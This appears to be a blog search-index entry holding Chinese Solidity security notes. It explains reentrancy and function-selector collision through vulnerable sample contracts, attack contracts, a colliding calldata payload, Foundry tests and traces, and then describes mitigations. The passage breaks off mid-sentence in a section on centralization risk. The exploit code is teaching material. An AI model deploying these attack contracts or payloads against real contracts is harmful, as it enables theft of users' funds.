<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>08-9Solidity笔记之十合约安全项</title>
    <link href="/2025/08/21/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8D%81%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%A1%B9/"/>
    <url>/2025/08/21/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8D%81%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="先看总结"><a href="#先看总结" class="headerlink" title="先看总结"></a>先看总结</h1><p><img src="/img/web3/contract_safe.png" alt="contract_safe"></p><h1 id="S01-重入攻击"><a href="#S01-重入攻击" class="headerlink" title="S01 重入攻击"></a>S01 重入攻击</h1><p>重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币</p><p>重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币</p><h2 id="0xAA-抢银行的故事"><a href="#0xAA-抢银行的故事" class="headerlink" title="0xAA 抢银行的故事"></a><code>0xAA</code> 抢银行的故事</h2><p>为了让大家更好理解，这里讲一个”黑客<code>0xAA</code>抢银行”的故事。</p><p>以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：</p><ol><li>查询用户的 <code>ETH</code> 余额，如果大于 0，进行下一步。</li><li>将用户的 <code>ETH</code> 余额从银行转给用户，并询问用户是否收到。</li><li>将用户名下的余额更新为<code>0</code>。</li></ol><p>一天黑客 <code>0xAA</code> 来到了银行，这是他和机器人柜员的对话：</p><ul><li>0xAA : 我要取钱，<code>1 ETH</code>。</li><li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li><li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li><li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li><li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li><li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li><li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li><li>…</li></ul><p>最后，<code>0xAA</code>通过重入攻击的漏洞，把银行的资产搬空了，银行卒。</p><p><img src="/img/web3/S01-1.png" alt="S01-1"></p><h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约"><a href="#银行合约" class="headerlink" title="银行合约"></a>银行合约</h3><p>银行合约非常简单，包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；包含<code>3</code>个函数：</p><ul><li><code>deposit()</code>：存款函数，将<code>ETH</code>存入银行合约，并更新用户的余额。</li><li><code>withdraw()</code>：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。<strong>注意：这个函数有重入漏洞！</strong></li><li><code>getBalance()</code>：获取银行合约里的<code>ETH</code>余额。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        uint256 balance = balanceOf[msg.sender]; // 获取余额<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！<br>        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>        require(success, &quot;Failed to send Ether&quot;);<br>        // 更新余额<br>        balanceOf[msg.sender] = 0;<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><p>重入攻击的一个攻击点就是合约转账<code>ETH</code>的地方：转账<code>ETH</code>的目标地址如果是合约，会触发对方合约的<code>fallback</code>（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/19_Fallback/readme.md">WTF Solidity 极简教程第 19 讲：接收 ETH</a>。<code>Bank</code>合约在<code>withdraw()</code>函数中存在<code>ETH</code>转账：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">(<span class="hljs-keyword">bool</span> success, ) = msg.sender.<span class="hljs-keyword">call</span>&#123;value: <span class="hljs-built_in">balance</span>&#125;(<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>假如黑客在攻击合约中的<code>fallback()</code>或<code>receive()</code>函数中重新调用了<code>Bank</code>合约的<code>withdraw()</code>函数，就会造成<code>0xAA</code>抢银行故事中的循环调用，不断让<code>Bank</code>合约转账给攻击者，最终将合约的<code>ETH</code>提空。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">receive</span>() external payable &#123;<br>    bank<span class="hljs-selector-class">.withdraw</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>下面我们看下攻击合约，它的逻辑非常简单，就是通过<code>receive()</code>回退函数循环调用<code>Bank</code>合约的<code>withdraw()</code>函数。它有<code>1</code>个状态变量<code>bank</code>用于记录<code>Bank</code>合约地址。它包含<code>4</code>个函数：</p><ul><li>构造函数: 初始化<code>Bank</code>合约地址。</li><li><code>receive()</code>: 回调函数，在接收<code>ETH</code>时被触发，并再次调用<code>Bank</code>合约的<code>withdraw()</code>函数，循环提款。</li><li><code>attack()</code>：攻击函数，先<code>Bank</code>合约的<code>deposit()</code>函数存款，然后调用<code>withdraw()</code>发起第一次提款，之后<code>Bank</code>合约的<code>withdraw()</code>函数和攻击合约的<code>receive()</code>函数会循环调用，将<code>Bank</code>合约的<code>ETH</code>提空。</li><li><code>getBalance()</code>：获取攻击合约里的<code>ETH</code>余额。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    Bank public bank; // Bank合约地址<br><br>    // 初始化Bank合约地址<br>    constructor(Bank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br><br>    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数<br>    receive() external payable &#123;<br>        if (bank.getBalance() &gt;= 1 ether) &#123;<br>            bank.withdraw();<br>        &#125;<br>    &#125;<br><br>    // 攻击函数，调用时 msg.value 设为 1 ether<br>    function attack() external payable &#123;<br>        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);<br>        bank.deposit&#123;value: 1 ether&#125;();<br>        bank.withdraw();<br>    &#125;<br><br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol><li>部署<code>Bank</code>合约，调用<code>deposit()</code>函数，转入<code>20 ETH</code>。</li><li>切换到攻击者钱包，部署<code>Attack</code>合约。</li><li>调用<code>Attack</code>合约的<code>attack()</code>函数发动攻击，调用时需转账<code>1 ETH</code>。</li><li>调用<code>Bank</code>合约的<code>getBalance()</code>函数，发现余额已被提空。</li><li>调用<code>Attack</code>合约的<code>getBalance()</code>函数，可以看到余额变为<code>21 ETH</code>，重入攻击成功。</li></ol><p>当然，不仅仅<code>ETH</code>转账会触发重入攻击，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的<code>callback</code>函数，都可能会引发重入攻击。所以这更多的是一个宏观上的设计问题，而不仅仅局限于ETH转账本身。</p><ul><li>演示测试攻击合约的代码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract AttackTest is Test &#123;<br>    Bank public bank;<br>    Attack public attack;<br>    function setUp() public &#123;<br>        bank = new Bank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new Attack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        console.log(&quot;attack start&quot;);<br>        attack.attack&#123;value: 1 * 1e18&#125;();<br>        // 测试断言：例如：检查Bank合约的余额是否被耗尽<br>        assertEq(address(bank).balance, 0, &quot;Bank should be drained&quot;);<br>        console.log(&quot;attack end&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>运行情况打印：循环调用不停的重入攻击</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [89457] AttackTest::test_attack()<br>    ├─ [0] console::log(&quot;attack start&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [70996] Attack::attack&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] Bank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   ├─ [36132] Bank::withdraw()<br>    │   │   ├─ [28467] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   └─ ← [Return] 3000000000000000000 [3e18]<br>    │   │   │   ├─ [26982] Bank::withdraw()<br>    │   │   │   │   ├─ [19317] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   └─ ← [Return] 2000000000000000000 [2e18]<br>    │   │   │   │   │   ├─ [17832] Bank::withdraw()<br>    │   │   │   │   │   │   ├─ [10167] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]<br>    │   │   │   │   │   │   │   ├─ [8682] Bank::withdraw()<br>    │   │   │   │   │   │   │   │   ├─ [1017] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0<br>    │   │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   └─ ← [Stop]<br>    │   │   │   └─ ← [Stop]<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [0] console::log(&quot;attack end&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure><h3 id="检查-影响-交互模式"><a href="#检查-影响-交互模式" class="headerlink" title="检查-影响-交互模式"></a>检查-影响-交互模式</h3><p>检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将<code>Bank</code>合约<code>withdraw()</code>函数中的更新余额提前到转账<code>ETH</code>之前，就可以修复漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw() external &#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH<br>    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。<br>    balanceOf[msg.sender] = 0;<br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h3><p>重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为<code>0</code>的状态变量<code>_status</code>。被<code>nonReentrant</code>重入锁修饰的函数，在第一次调用时会检查<code>_status</code>是否为<code>0</code>，紧接着将<code>_status</code>的值改为<code>1</code>，调用结束后才会再改为<code>0</code>。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/11_Modifier/readme.md">WTF Solidity 极简教程第 11 讲：修饰器</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 private _status; // 重入锁<br><br>// 重入锁<br>modifier nonReentrant() &#123;<br>    // 在第一次调用 nonReentrant 时，_status 将是 0<br>    require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>    // 在此之后对 nonReentrant 的任何调用都将失败<br>    _status = 1;<br>    _;<br>    // 调用结束，将 _status 恢复为0<br>    _status = 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要用<code>nonReentrant</code>重入锁修饰<code>withdraw()</code>函数，就可以预防重入攻击了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用重入锁保护有漏洞的函数<br>function withdraw() external nonReentrant&#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br><br>    balanceOf[msg.sender] = 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过<code>_asyncTransfer(address dest, uint256 amount)</code>将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用<code>withdrawPayments(address payable payee)</code>进行资产的主动获取。</p><p><strong>OpenZeppelin 提供了 <code>ReentrancyGuard</code> 合约，使用修饰器防止重入</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个<code>0xAA</code>抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行<code>ETH</code>转账时进行重入攻击。实际业务中，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的<code>external</code>函数，虽然可能会消耗更多的<code>gas</code>，但是可以预防更大的损失。</p><h1 id="S02-选择器碰撞"><a href="#S02-选择器碰撞" class="headerlink" title="S02. 选择器碰撞"></a>S02. 选择器碰撞</h1><p>这一讲，我们将介绍选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑的原因之一。在2021年8月，Poly Network在ETH，BSC，和Polygon上的跨链桥合约被盗，损失高达6.11亿美元（<a href="https://rekt.news/zh/polynetwork-rekt/">总结</a>）。这是2021年最大的区块链黑客事件，也是历史被盗金额榜单上第2名，仅次于 Ronin 桥黑客事件。</p><h2 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h2><p>以太坊智能合约中，函数选择器是函数签名 <code>&quot;&lt;function name&gt;(&lt;function input types&gt;)&quot;</code> 的哈希值的前<code>4</code>个字节（<code>8</code>位十六进制）。当用户调用合约的函数时，<code>calldata</code>的前<code>4</code>字节就是目标函数的选择器，决定了调用哪个函数。如果你不了解它，可以阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/29_Selector/readme.md">WTF Solidity极简教程第29讲：函数选择器</a>。</p><p>由于函数选择器只有<code>4</code>字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如<code>transferFrom(address,address,uint256)</code>和<code>gasprice_bit_ether(int128)</code>有着相同的选择器：<code>0x23b872dd</code>。当然你也可以写个脚本暴力破解。</p><p>大家可以用这两个网站来查同一个选择器对应的不同函数：</p><ol><li><a href="https://www.4byte.directory/">https://www.4byte.directory/</a></li><li><a href="https://sig.eth.samczsun.com/">https://sig.eth.samczsun.com/</a></li></ol><p>你也可以使用下面的<code>Power Clash</code>工具进行暴力破解：</p><ol><li>PowerClash: <a href="https://github.com/AmazingAng/power-clash">https://github.com/AmazingAng/power-clash</a></li></ol><p>相比之下，钱包的公钥有<code>64</code>字节，被碰撞出来的概率几乎为<code>0</code>，非常安全。</p><h2 id="0xAA-解决斯芬克斯之谜"><a href="#0xAA-解决斯芬克斯之谜" class="headerlink" title="0xAA 解决斯芬克斯之谜"></a><code>0xAA</code> 解决斯芬克斯之谜</h2><p>以太坊的人得罪了天神，天神震怒。天后赫拉为了惩罚以太坊的人，在以太坊的峭崖上降下一个名叫斯芬克斯的人面狮身的女妖。她向每一个路过悬崖的以太坊用户提出一个谜语：“什么东西在早晨用四只脚走路，中午两只脚走路，晚间三只脚走路，在一切生物中这是唯一的用不同数目的脚走路的生物。脚最多的时候，正是速度和力量最小的时候。”对于这个奥妙费解的谜语，凡猜中者即可活命，凡猜不中者一律被吃掉。过路的人全被斯芬克斯吃了，以太坊用户陷入恐惧之中。斯芬克斯用选择器<code>0x10cd2dc7</code>来验证答案是否正确。</p><p>有一天上午，俄狄浦斯路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function man()&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语被猜中后，俄狄浦斯得以生还。</p><p>那一天下午，<code>0xAA</code>路过此地，会见了女妖，并猜中了这神秘奥妙之谜。他说：“这是<code>&quot;function peopleLduohW(uint256)&quot;</code>啊！在生命的早晨，他是个孩子，用两条腿和两只手爬行；到了生命的中午，他变成壮年，只用两条腿走路；到了生命的傍晚，他年老体衰，必须借助拐杖走路，所以被称为三只脚。”谜语再次被猜中后，斯芬克斯气急败坏，脚下一打滑就从巍峨的峭崖上掉下去摔死了。</p><p><img src="/img/web3/S02-2.png" alt="S02-2"></p><h2 id="漏洞合约例子-1"><a href="#漏洞合约例子-1" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h3><p>下面我们来看一下有漏洞的合约例子。<code>SelectorClash</code>合约有<code>1</code>个状态变量 <code>solved</code>，初始化为<code>false</code>，攻击者需要将它改为<code>true</code>。合约主要有<code>2</code>个函数，函数名沿用自 Poly Network 漏洞合约。</p><ol><li><code>putCurEpochConPubKeyBytes()</code> ：攻击者调用这个函数后，就可以将<code>solved</code>改为<code>true</code>，完成攻击。但是这个函数检查<code>msg.sender == address(this)</code>，因此调用者必须为合约本身，我们需要看下其他函数。</li><li><code>executeCrossChainTx()</code> ：通过它可以调用合约内的函数，但是函数参数的类型和目标函数不太一样：目标函数的参数为<code>(bytes)</code>，而这里调用的函数参数为<code>(bytes,bytes,uint64)</code>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.10;<br><br>contract SelectorClash &#123;<br>    bool public solved; // 攻击是否成功<br><br>    // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。<br>    function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123;<br>        require(msg.sender == address(this), &quot;Not Owner&quot;);<br>        solved = true;<br>    &#125;<br><br>    // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。<br>    function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123;<br>        (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>我们的目标是利用<code>executeCrossChainTx()</code>函数调用合约中的<code>putCurEpochConPubKeyBytes()</code>，目标函数的选择器为：<code>0x41973cd9</code>。观察到<code>executeCrossChainTx()</code>中是利用<code>_method</code>参数和<code>&quot;(bytes,bytes,uint64)&quot;</code>作为函数签名计算的选择器。因此，我们只需要选择恰当的<code>_method</code>，让这里算出的选择器等于<code>0x41973cd9</code>，通过选择器碰撞调用目标函数。</p><p>Poly Network黑客事件中，黑客碰撞出的<code>_method</code>为 <code>f1121318093</code>，即<code>f1121318093(bytes,bytes,uint64)</code>的哈希前<code>4</code>位也是<code>0x41973cd9</code>，可以成功的调用函数。接下来我们要做的就是将<code>f1121318093</code>转换为<code>bytes</code>类型：<code>0x6631313231333138303933</code>，然后作为参数输入到<code>executeCrossChainTx()</code>中。<code>executeCrossChainTx()</code>函数另<code>3</code>个参数不重要，填 <code>0x</code>, <code>0x</code>, <code>0</code> 就可以。</p><h2 id="演示-1"><a href="#演示-1" class="headerlink" title="&#96;&#96;演示"></a>&#96;&#96;演示</h2><ol><li>部署<code>SelectorClash</code>合约。</li><li>调用<code>executeCrossChainTx()</code>，参数填<code>0x6631313231333138303933</code>，<code>0x</code>，<code>0x</code>，<code>0</code>，发起攻击。</li><li>查看<code>solved</code>变量的值，被修改为<code>true</code>，攻击成功。</li></ol><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract SelectorClashTest is Test &#123;<br>    SelectorClash private selector;<br>    function setUp() public &#123;<br>        selector = new SelectorClash();<br>    &#125;<br>    function test_selector() public &#123;<br>        bool Before=selector.solved();<br>        console.log(&quot;selector.solved Before is  &quot;,Before);<br>        bytes memory _method=&quot;0x6631313231333138303933&quot;;<br><br>        bool success = selector.executeCrossChainTx(<br>            hex&quot;6631313231333138303933&quot;, // bytes param1<br>            &quot;&quot;,                         // bytes param2<br>            &quot;&quot;,                         // bytes param3<br>            0                           // uint256 param4<br>        );<br>        bool After=selector.solved();<br>        console.log(&quot;selector.solved After is  &quot;,After);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>Logs:<br>  selector.solved Before is   false<br>  selector.solved After is   true<br><br>Traces:<br>  [41344] SelectorClashTest::test_selector()<br>    ├─ [2487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] false<br>    ├─ [0] console::log(&quot;selector.solved Before is  &quot;, false) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [26267] SelectorClash::executeCrossChainTx(0x6631313231333138303933, 0x, 0x, 0)<br>    │   ├─ [21125] SelectorClash::putCurEpochConPubKeyBytes(0x)<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Return] true<br>    ├─ [487] SelectorClash::solved() [staticcall]<br>    │   └─ ← [Return] true<br>    ├─ [0] console::log(&quot;selector.solved After is  &quot;, true) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure><h1 id="S03-中心化风险"><a href="#S03-中心化风险" class="headerlink" title="S03 中心化风险"></a>S03 中心化风险</h1><p>伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。这类项目由于包装的很去中心化，容易得到投资者信任，所以当黑客事件发生时，被盗金额也往往更大。</p><p>近两年爆火的链游项目 Axie 的 Ronin 链跨链桥项目在 2022 年 3 月被盗 6.24 亿美元，是历史上被盗金额最大的事件。Ronin 跨链桥由 9 个验证者维护，必须有 5 个人达成共识才能批准存款和提款交易。这看起来像多签一样，非常去中心化。但实际上其中 4 个验证者由 Axie 的开发公司 Sky Mavis 控制，而另 1 个由 Axie DAO 控制的验证者也批准了 Sky Mavis 验证节点代表他们签署交易。因此，在攻击者获取了 Sky Mavis 的私钥后（具体方法未披露），就可以控制 5 个验证节点，授权盗走了 173,600 ETH 和 2550 万 USDC。此外，在 2023 年 8 月 1 日，PEPE 多重签名钱包将阈值从<code>5/8</code>更改为仅<code>2/8</code>，并从多签地址转出大量 